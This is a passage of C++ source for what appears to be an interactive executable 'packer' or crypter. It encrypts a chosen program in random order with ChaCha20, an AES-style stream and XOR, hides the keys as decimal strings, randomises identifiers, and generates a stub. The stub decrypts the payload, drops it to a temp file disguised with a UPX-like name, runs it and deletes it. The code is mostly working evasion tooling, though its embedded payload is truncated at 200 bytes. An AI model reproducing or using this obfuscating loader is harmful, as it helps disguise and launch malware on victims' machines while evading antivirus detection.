    std::vector<unsigned char> nonceBytes = )" + keyVar + R"(FromDecimal()" + nonceVar + R"();
    
    )" + funcName + R"(()" + bufferVar + R"(, keyBytes.data(), nonceBytes.data());
    
#ifdef _WIN32
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFile = std::string(tempPath) + "\\upx_local_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
#else
    std::string tempFile = "/tmp/upx_local_temp_" + std::to_string(getpid());
#endif
    
    std::ofstream outFile(tempFile, std::ios::binary);
    if (!outFile) return 1;
    
    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
    outFile.close();
    
#ifdef _WIN32
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    DeleteFileA(tempFile.c_str());
#else
    chmod(tempFile.c_str(), 0755);
    system(tempFile.c_str());
    unlink(tempFile.c_str());
#endif
    
    return 0;
})";

        // Save the packed executable source
        std::filesystem::path inputPath(inputFile);
        std::string outputFile = "local_packed_chacha20_" + inputPath.stem().string() + "_" + std::to_string(rng() % 10000) + ".cpp";
        
        std::ofstream outFile(outputFile);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile << sourceCode;
        outFile.close();

        std::cout << "✅ Local ChaCha20 Packer generated successfully!" << std::endl;
        std::cout << "📁 Output: " << outputFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "📂 Source file: " << inputFile << std::endl;
        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o local_packed_chacha20_" << inputPath.stem().string() << ".exe" << std::endl;
    }

    // Local Crypto Service - Triple (option 15)
    void localCryptoServiceTriple() {
        std::string inputFile;
        std::cout << "Enter local file path to pack: ";
        std::getline(std::cin, inputFile);

        std::ifstream file(inputFile, std::ios::binary);
        if (!file) {
            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
            return;
        }

        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        // Generate all keys
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        
        // Apply triple encryption with randomized order
        switch (keys.encryption_order) {
            case 0: // ChaCha20 -> AES -> XOR
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(encryptedData, keys.aes_key);
                xorCrypt(encryptedData, keys.xor_key);
                break;
            case 1: // ChaCha20 -> XOR -> AES
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(encryptedData, keys.xor_key);
                aesStreamCrypt(encryptedData, keys.aes_key);
                break;
            case 2: // AES -> ChaCha20 -> XOR
                aesStreamCrypt(encryptedData, keys.aes_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(encryptedData, keys.xor_key);
                break;
            case 3: // AES -> XOR -> ChaCha20
                aesStreamCrypt(encryptedData, keys.aes_key);
                xorCrypt(encryptedData, keys.xor_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
            case 4: // XOR -> ChaCha20 -> AES
                xorCrypt(encryptedData, keys.xor_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(encryptedData, keys.aes_key);
                break;
            case 5: // XOR -> AES -> ChaCha20
                xorCrypt(encryptedData, keys.xor_key);
                aesStreamCrypt(encryptedData, keys.aes_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
        }

        // Convert all keys to decimal for obfuscation
        std::string chachaKeyDecimal = bytesToBigDecimal(keys.chacha_key);
        std::string chachaNonceDecimal = bytesToBigDecimal(keys.chacha_nonce);
        std::string aesKeyDecimal = bytesToBigDecimal(keys.aes_key);
        std::string xorKeyDecimal = bytesToBigDecimal(keys.xor_key);

        // Generate unique variable names
        std::string payloadVar = generateUniqueVarName();
        std::string keyVar1 = generateUniqueVarName();
        std::string keyVar2 = generateUniqueVarName();
        std::string keyVar3 = generateUniqueVarName();
        std::string nonceVar = generateUniqueVarName();
        std::string sizeVar = generateUniqueVarName();
        std::string bufferVar = generateUniqueVarName();
        std::string funcName1 = generateUniqueVarName();
        std::string funcName2 = generateUniqueVarName();
        std::string funcName3 = generateUniqueVarName();

        // Create the packed executable source with all three algorithms
        std::string sourceCode = R"(#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <cstdlib>
#endif

// ChaCha20 Implementation
void quarterRound(unsigned int& a, unsigned int& b, unsigned int& c, unsigned int& d) {
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8) | (d >> 24);
    c += d; b ^= c; b = (b << 7) | (b >> 25);
}

void chachaBlock(unsigned int out[16], const unsigned int in[16]) {
    for (int i = 0; i < 16; i++) out[i] = in[i];
    
    for (int i = 0; i < 10; i++) {
        quarterRound(out[0], out[4], out[8], out[12]);
        quarterRound(out[1], out[5], out[9], out[13]);
        quarterRound(out[2], out[6], out[10], out[14]);
        quarterRound(out[3], out[7], out[11], out[15]);
        
        quarterRound(out[0], out[5], out[10], out[15]);
        quarterRound(out[1], out[6], out[11], out[12]);
        quarterRound(out[2], out[7], out[8], out[13]);
        quarterRound(out[3], out[4], out[9], out[14]);
    }
    
    for (int i = 0; i < 16; i++) out[i] += in[i];
}

void initChachaState(unsigned int state[16], const unsigned char key[32], const unsigned char nonce[12]) {
    const char* constants = "expand 32-byte k";
    memcpy(state, constants, 16);
    memcpy(state + 4, key, 32);
    state[12] = 0;
    memcpy(state + 13, nonce, 12);
}

void )" + funcName1 + R"((std::vector<unsigned char>& data, const unsigned char key[32], const unsigned char nonce[12]) {
    unsigned int state[16];
    initChachaState(state, key, nonce);
    
    for (size_t i = 0; i < data.size(); i += 64) {
        unsigned int keystream[16];
        chachaBlock(keystream, state);
        
        unsigned char* ks_bytes = (unsigned char*)keystream;
        for (size_t j = 0; j < 64 && i + j < data.size(); j++) {
            data[i + j] ^= ks_bytes[j];
        }
        
        state[12]++;
    }
}

// AES Stream Implementation
void )" + funcName2 + R"((std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    static const unsigned char sbox[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    };
    
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char keyByte = key[i % key.size()];
        unsigned char nonceByte = (i >> 8) ^ (i & 0xFF);
        unsigned char mixedKey = sbox[keyByte] ^ nonceByte;
        data[i] ^= mixedKey;
    }
}

// Enhanced XOR Implementation
void )" + funcName3 + R"((std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char keyByte = key[i % key.size()];
        unsigned char posByte = (i * 0x9E3779B9) & 0xFF;
        data[i] ^= keyByte ^ posByte;
    }
}

std::vector<unsigned char> keyFromDecimal(const std::string& decimal) {
    std::vector<unsigned char> result;
    std::vector<int> bigNum;
    
    for (char c : decimal) bigNum.push_back(c - '0');
    
    while (!bigNum.empty() && !(bigNum.size() == 1 && bigNum[0] == 0)) {
        int remainder = 0;
        for (size_t i = 0; i < bigNum.size(); i++) {
            int current = remainder * 10 + bigNum[i];
            bigNum[i] = current / 256;
            remainder = current % 256;
        }
        result.insert(result.begin(), remainder);
        while (!bigNum.empty() && bigNum[0] == 0) bigNum.erase(bigNum.begin());
    }
    
    return result;
}

int main() {
    const std::string )" + keyVar1 + R"( = ")" + chachaKeyDecimal + R"(";
    const std::string )" + nonceVar + R"( = ")" + chachaNonceDecimal + R"(";
    const std::string )" + keyVar2 + R"( = ")" + aesKeyDecimal + R"(";
    const std::string )" + keyVar3 + R"( = ")" + xorKeyDecimal + R"(";
    const unsigned int )" + sizeVar + R"( = )" + std::to_string(encryptedData.size()) + R"(;
    const unsigned int order = )" + std::to_string(keys.encryption_order) + R"(;
    
    unsigned char )" + payloadVar + R"([)" + std::to_string(encryptedData.size()) + R"(] = {)";

        // Embed the encrypted payload (truncated for large files)
        size_t maxEmbedSize = std::min(encryptedData.size(), size_t(200));
        for (size_t i = 0; i < maxEmbedSize; i++) {
            if (i % 16 == 0) sourceCode += "\n        ";
            sourceCode += "0x" + 
                std::string(1, "0123456789ABCDEF"[(encryptedData[i] >> 4) & 0xF]) + 
                std::string(1, "0123456789ABCDEF"[encryptedData[i] & 0xF]);
            if (i < maxEmbedSize - 1) sourceCode += ",";
        }
        
        if (encryptedData.size() > 200) {
            sourceCode += "\n        /* ... " + std::to_string(encryptedData.size() - 200) + " more bytes ... */";
        }

        sourceCode += R"(
    };
    
    std::vector<unsigned char> )" + bufferVar + R"(()" + payloadVar + R"(, )" + payloadVar + R"( + )" + sizeVar + R"();
    std::vector<unsigned char> chachaKey = keyFromDecimal()" + keyVar1 + R"();
    std::vector<unsigned char> chachaNonce = keyFromDecimal()" + nonceVar + R"();
    std::vector<unsigned char> aesKey = keyFromDecimal()" + keyVar2 + R"();
    std::vector<unsigned char> xorKey = keyFromDecimal()" + keyVar3 + R"();
    
    // Decrypt in reverse order
    switch (order) {
        case 0: // Reverse: XOR -> AES -> ChaCha20
            )" + funcName3 + R"(()" + bufferVar + R"(, xorKey);
            )" + funcName2 + R"(()" + bufferVar + R"(, aesKey);
            )" + funcName1 + R"(()" + bufferVar + R"(, chachaKey.data(), chachaNonce.data());
            break;
        case 1: // Reverse: AES -> XOR -> ChaCha20
            )" + funcName2 + R"(()" + bufferVar + R"(, aesKey);
            )" + funcName3 + R"(()" + bufferVar + R"(, xorKey);
            )" + funcName1 + R"(()" + bufferVar + R"(, chachaKey.data(), chachaNonce.data());
            break;
        case 2: // Reverse: XOR -> ChaCha20 -> AES
            )" + funcName3 + R"(()" + bufferVar + R"(, xorKey);
            )" + funcName1 + R"(()" + bufferVar + R"(, chachaKey.data(), chachaNonce.data());
            )" + funcName2 + R"(()" + bufferVar + R"(, aesKey);
            break;
        case 3: // Reverse: ChaCha20 -> XOR -> AES
            )" + funcName1 + R"(()" + bufferVar + R"(, chachaKey.data(), chachaNonce.data());
            )" + funcName3 + R"(()" + bufferVar + R"(, xorKey);
            )" + funcName2 + R"(()" + bufferVar + R"(, aesKey);
            break;
        case 4: // Reverse: AES -> ChaCha20 -> XOR
            )" + funcName2 + R"(()" + bufferVar + R"(, aesKey);
            )" + funcName1 + R"(()" + bufferVar + R"(, chachaKey.data(), chachaNonce.data());
            )" + funcName3 + R"(()" + bufferVar + R"(, xorKey);
            break;
        case 5: // Reverse: ChaCha20 -> AES -> XOR
            )" + funcName1 + R"(()" + bufferVar + R"(, chachaKey.data(), chachaNonce.data());
            )" + funcName2 + R"(()" + bufferVar + R"(, aesKey);
            )" + funcName3 + R"(()" + bufferVar + R"(, xorKey);
            break;
    }
    
#ifdef _WIN32
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFile = std::string(tempPath) + "\\upx_local_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
#else
